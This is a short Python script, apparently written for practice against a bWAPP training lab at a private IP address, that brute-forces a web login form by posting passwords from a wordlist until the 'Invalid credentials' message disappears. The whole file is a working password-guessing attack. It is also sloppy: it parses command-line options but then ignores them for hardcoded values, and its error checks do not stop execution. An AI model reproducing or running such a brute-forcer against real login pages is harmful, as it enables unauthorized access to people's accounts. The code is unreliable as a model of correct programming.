import requests
import sys
import os

username = None
hint_word = None
wordlist = None

args = " ".join(sys.argv[1:]).replace(" ", "")
for argument in args.split("-"):
    if "=" in argument:
        key, value = argument.split("=", 1)
        if key == 'u':
            username = value
        elif key == 'i':
            hint_word = value
        elif key == 'w':
            wordlist = value   
            
if not username or not hint_word or not wordlist:
    print(f"please Enter the following arguments:\n{sys.argv[0]} -u = <username> -w = <wordlist> -i = <word in login>")
if not os.path.exists(wordlist):
    print(f"[!] File not found: {wordlist}")
    

url = 'http://192.168.182.139/bWAPP/login.php'
hint_word = 'Invalid credentials'

with open('random_words.txt', 'r') as f:
    for word in f:
        password = word.strip()
        payload = {
            f'login': 'bee',
            f'password': password,
            f'form': 'submit',
            f'security_level': 0
            }
        response =requests.post(url, data=payload)
        if hint_word not in response.text:
            print(f"login seccsuss with password  \033[92m{password}\033[0m")
            break
        else:
            print(f"tried passowrd:\033[91m{password}\033[0m")



